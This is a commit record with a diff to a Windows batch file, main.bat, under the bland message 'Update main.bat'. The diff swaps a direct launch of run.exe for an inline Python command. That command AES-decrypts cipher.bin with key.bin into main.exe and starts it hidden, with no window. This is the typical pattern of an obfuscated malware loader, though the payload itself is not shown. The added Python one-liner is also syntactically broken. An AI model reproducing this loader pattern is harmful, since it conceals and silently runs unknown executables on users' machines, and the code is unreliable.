57706b70a8a28ff5e2003e91e9ba842ed21a0500
waveget <nathanppwalker@gmail.com>
2024-10-13 13:45:48 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,2 +1,13 @@
 @echo off
-start /B run.exe
+rem Decrypt the executable
+python -c "from Crypto.Cipher import AES; \
+import os; \
+with open('key.bin', 'rb') as f: key = f.read(); \
+cipher = AES.new(key, AES.MODE_ECB); \
+with open('cipher.bin', 'rb') as f: \
+    ciphertext = f.read(); \
+plaintext = cipher.decrypt(ciphertext); \
+with open('main.exe', 'wb') as f: f.write(plaintext);"
+
+rem Run the decrypted executable without a window
+start /B main.exe
